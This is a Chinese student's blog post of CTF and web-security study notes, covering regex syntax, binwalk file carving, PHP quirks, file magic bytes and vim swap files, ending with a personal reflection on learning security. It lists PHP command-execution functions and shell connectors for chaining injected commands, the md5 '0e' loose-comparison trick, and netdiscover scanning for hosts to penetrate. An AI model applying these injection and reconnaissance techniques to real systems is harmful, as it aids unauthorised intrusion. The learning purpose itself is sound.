<p>^或\A 匹配字符串开始的位置</p>
<p>$或者\Z  匹配字符串的结束位置</p>
<p>|   匹配两个或多个模式</p>
<p>[]   匹配方括号中的任意一个字符</p>
<p>[^]  匹配除方括号中字符以外的任意一个字符</p>
<p>()  将括号中作为一个整体以便将其中的内容获取到</p>
<h3 id="4-1-1php正则表达式-w-w-w-的区别？"><a href="#4-1-1php正则表达式-w-w-w-的区别？" class="headerlink" title="4.1.1php正则表达式[\w]+,\w+,[\w+]的区别？"></a>4.1.1php正则表达式[\w]+,\w+,[\w+]的区别？</h3><p>[\w]+和\w+没有区别，都是匹配数字和字母下划线的多个字符；</p>
<p>[\w+]表示匹配数字、字母、下划线和加号本身字符；</p>
<h3 id="4-1-2例"><a href="#4-1-2例" class="headerlink" title="4.1.2例"></a>4.1.2例</h3><p>[]：表示数组而非排列，即不按固定次序位置排列；在[]内的字符可以任意次序出现。</p>
<p>[ABC]+：可以匹配”AAABBBCCC,BBBAAACCC,BACCBACAACBAC,…”，不是一定按固定A….B….C…的次序排列。</p>
<p>[\w./-+]+：是匹配\w [0-9a-zA-Z_] 或 . 或 / 或 - 或 + 字符；</p>
<p>在[./-+]内均表示字符本身；</p>
<p>在[]+外表示{1,}至少1次或多次；</p>
<p>在[.]内点，不是任意字符的意思，就是匹配点.字符本身，点.可以不需要加反斜杠.。</p>
<p>在[]内特殊字符，表示匹配特殊字符本身，不需要加反斜杠，</p>
<p>在[]外特殊字符，表示匹配特殊字符本身，必须要加反斜杠。</p>
<p>\W 元字符用于查找非单词字符。</p>
<p>单词字符包括：a-z、A-Z、0-9，以及下划线。</p>
<p>故[^\W]可以匹配所有单词字符    </p>
<p>^：非的意思</p>
<p>/^$/：正则匹配的开头结尾</p>
<h3 id="4-1-3正则表达式“-d-d-d-”是什么意思？"><a href="#4-1-3正则表达式“-d-d-d-”是什么意思？" class="headerlink" title="4.1.3正则表达式“\d+||(\d+\.\d+”是什么意思？"></a>4.1.3正则表达式“\d+||(\d+\.\d+”是什么意思？</h3><p>\d  是匹配一个数字(0到9)</p>
<p>\d 前面多了第一个\ 是为了在程序中转义第二个\，这个你可以忽略</p>
<p>+表示 1个或多个组合起来</p>
<p>\d+ 就表示多个数字，形如 12、44、6763……</p>
<p>. 匹配一个小数点</p>
<p>\d+.\d+ 就表示小数，形如12.334、0.12、87.343……</p>
<p>| 表示或者，一个竖线就够了</p>
<p>() 括号在这里表示分组，实际不匹配任何字符，此处不要括号也可以</p>
<p>\d+||(\d+.\d+)  多个连续的数字或者 多个连续的数+小数点+多个连续的数<br>翻译下就是 非负整数或者非负小数</p>
<h2 id="4-23-binwalk使用"><a href="#4-23-binwalk使用" class="headerlink" title="4.23.binwalk使用"></a>4.23.binwalk使用</h2><p>binwalk  +文件路径  //分析文件中隐藏的其他文件。<br>dd if=图片名 of=ZIP压缩包的名称（自己命名） skip=偏移量 bs=1</p>
<h2 id="5-1php定界符"><a href="#5-1php定界符" class="headerlink" title="5.1php定界符"></a>5.1php定界符</h2><p>​       短标签<?  ?>  &lt;%  %&gt;</p>
<p>​       var_dump()查看变量类型</p>
<p>​       定界符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">          $a=&lt;&lt;&lt;EOT</span><br><span class="line">          XXXXXXX</span><br><span class="line">          EOT;</span><br><span class="line">          echo $a;</span><br><span class="line">          ?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="5-2正则表达式-二）"><a href="#5-2正则表达式-二）" class="headerlink" title="5.2正则表达式(二）"></a>5.2正则表达式(二）</h2><p>模式分隔符后的”i”标记这是一个大小写不敏感的搜索</p>
<p>模式中的 \b 标记一个单词边界，所以只有独立的单词”web”会被匹配，而不会匹配</p>
<p>PHP提供4个专门的执行外部命令的函数：exec(), system(), passthru(), shell_exec()</p>
<p>除了拼接函数外，我们还可以使用命令连接符来组合这些系统函数增加命令执行成功率。常见的命令连接符有（“|，&amp;&amp;，||”这三个连接符都是Windows系统与Linux系统共有的，而“&amp;”是Windows系统特有，“；”是Linux系统特有的）：</p>
<p>|：管道操作符</p>
<p>A|B:无论执行的A命令是否正确，B命令都执行</p>
<p>&amp;&amp;：逻辑与</p>
<p>A&amp;&amp;B：只有在A命令成功执行的前提下，B命令才可以执行</p>
<p>||：逻辑或</p>
<p>A||B：只有在A命令没有执行失败的前提下，B命令才可以执行</p>
<p>&amp;</p>
<p>A&amp;B:不管A是否执行成功，B命令都会执行</p>
<p>A&amp;B:不管A是否执行成功，B命令都会执行</p>
<h2 id="5-3字符串经过md5加密"><a href="#5-3字符串经过md5加密" class="headerlink" title="5.3字符串经过md5加密"></a>5.3字符串经过md5加密</h2><p>  这里是0e开头的，在进行等于比较的时候，PHP 把它当作科学计数法，0 的无论多少次方都是零。</p>
<h2 id="5-4各类文件的16进制开头结尾"><a href="#5-4各类文件的16进制开头结尾" class="headerlink" title="5.4各类文件的16进制开头结尾"></a>5.4各类文件的16进制开头结尾</h2><p>jpg      文件头:  FF D8             文件尾： FF D9<br>JPEG     文件头：FF D8 FF           文件尾：FF D9<br>PNG    文件头：89 50 4E 47    文件尾：AE 42 60 82<br>GIF（gif ）<br>文件头：47 49 46 38    文件尾：00 3B<br>ZIP Archive（zip）<br>文件头：50 4B 03 04    文件尾：50 4B<br>TIFF（tif）<br>文件头：49 49 2A 00    文件尾：未知<br>Windows Bitmap（bmp）<br>文件头：42 4D    文件尾：未知<br>CAD（dwg）<br>文件头：41 43 31 30    文件尾：未知<br>XML（xml）<br>文件头：3C 3F 78 6D 6C    文件尾：未知<br>HTML（html）<br>文件头：68 74 6D 6C 3E<br>gif图像开始标志：47 49 46 38 39 61 结束标志：01 01 00 3B</p>
<h2 id="5-5局域网主机发现"><a href="#5-5局域网主机发现" class="headerlink" title="5.5局域网主机发现"></a>5.5局域网主机发现</h2><p>使用netdiscover 探测局域网内的主机，目的是发现需要渗透的主机</p>
<p>指定IP段</p>
<p>例如：10.10.10.0</p>
<p>netdiscover  -r 10.10.10.0/24</p>
<p>选择监听的网卡：比如eth0</p>
<p>netdiscover  -i eth0</p>
<p>主动发现：-i指定所要侦听的网卡，-r指定ip段。</p>
<p>netdiscover -i eth0 -r 10.10.10.0/24</p>
<h2 id="6-1vim-交换文件名"><a href="#6-1vim-交换文件名" class="headerlink" title="6.1vim 交换文件名"></a>6.1vim 交换文件名</h2><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
<p>以 index.php 为例：   </p>
<p>第一次产生的交换文件名为 .index.php.swp</p>
<p>再次意外退出后，将会产生名为 .index.php.swo 的交换文件</p>
<p>第三次产生的交换文件则为 .index.php.swn</p>
<h1 id="二、学习总结"><a href="#二、学习总结" class="headerlink" title="二、学习总结"></a>二、学习总结</h1><p>这些是近十天的学习总结，学的不算很多，但很杂乱，近期恶补了一些php代码并且参加了一些ctf比赛，虽然往往一场ctf比赛只能写出一道甚至一道都写不出，但总的来说，应该算是有了一定的基础。</p>
<p>算算时间，学习网安也有大半年了，但有效时间也只有不到两个月，在这有效学习时间内，我学习了以下内容。</p>
<p>1.burpsuite抓包爆破</p>
<p>2.top10漏洞（除CSRF）</p>
<p>3.工具的利用</p>
<p>4.近期看着博客步骤对breach1.0进行一次完整的渗透</p>
<p>5.PHP语言</p>
<p>6.MySQL数据库</p>
<p>7.认识HTML，css，js</p>
<p>8.linux基础</p>
<p>9.SQL基础</p>
<p>10.web渗透之信息收集</p>
<h1 id="三、感悟"><a href="#三、感悟" class="headerlink" title="三、感悟"></a>三、感悟</h1><p>今天是2022年10月30日，距离第一次接触网安已有一年有余，那时意气风发，抱有对黑客技术的热爱与热情加入了信息安全实验室，但在实验室，我迷茫了，对所学知识的模糊认识产生了自我否定——我是不是不适合网安，我是不是比较笨拙？带着疑惑我不知所措，导致在寒假期间彻底摆烂，也因此主动退出实验室。</p>
<p>至2022年4月13日，胡老师想找几个对网安有兴趣的学生学习网安知识，我心中的火又燃了起来，我知道这是一个机会，证明我可以学好网安的唯一机会，我又开始学习网安。这次学的不再是逆向工程，而是web安全！</p>
<p>由于当时已到学期中旬，专业课繁多，学习时间较少，也快到期末，所以网安学习计划又搁置了，到了暑假事务繁多，有效学习时间也只有不到半个月，对此我深深惭愧。</p>
<p>寒暑假逆袭的关键，而我却没有加以利用，认真去学习！</p>
<p>接着开学封校，一直到九月中旬才能来校学习，这次，我不会再浪费时间，我一直以来的黑客梦永远不会消散。</p>
<p>虽然道路艰难，但我会一直前行，漫漫长征路，偏向虎山行，此志共勉！</p>
]]></content>
      <categories>
        <category>——网络安全</category>
      </categories>
      <tags>
        <tag>——web</tag>
      </tags>
  </entry>
</search>
